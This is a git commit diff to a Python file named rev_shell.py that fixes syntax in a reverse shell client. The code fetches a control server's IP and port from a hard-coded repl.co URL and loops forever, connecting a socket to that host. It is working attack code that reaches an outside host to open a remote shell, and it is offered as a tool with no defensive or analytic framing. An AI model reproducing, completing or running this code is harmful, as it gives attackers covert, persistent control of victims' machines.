151a8aa2c2ae6641e9e07de536e3934ca0f0fba2
pyscripter99 <78647110+pyscripter99@users.noreply.github.com>
2022-06-28 19:28:12 +1000

    Update rev_shell.py

--- rev_shell.py
+++ rev_shell.py
@@ -1,13 +1,13 @@
 import json, requests, subprocess, socket
 
 #wait forever for a connection!
-DATA_URL = https://cornsilkdishonestchapter-dns.ryderretzlaff.repl.co/get_dns/c6e5ddce-e2a7-4163-bfd1-e48ff51561d7/""
-DATA_R = requests.get(DATA_URL)
+DATA_URL = "https://cornsilkdishonestchapter-dns.ryderretzlaff.repl.co/get_dns/c6e5ddce-e2a7-4163-bfd1-e48ff51561d7/"
+DATA_R = requests.get(DATA_URL).text
 DATA = json.loads(DATA_R)
 
 while True:
     try:
-        DATA_R = requests.get(DATA_URL)
+        DATA_R = requests.get(DATA_URL).text
         DATA = json.loads(DATA_R)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((socket.gethostbyname(DATA["ip"]), int(DATA["port"])))
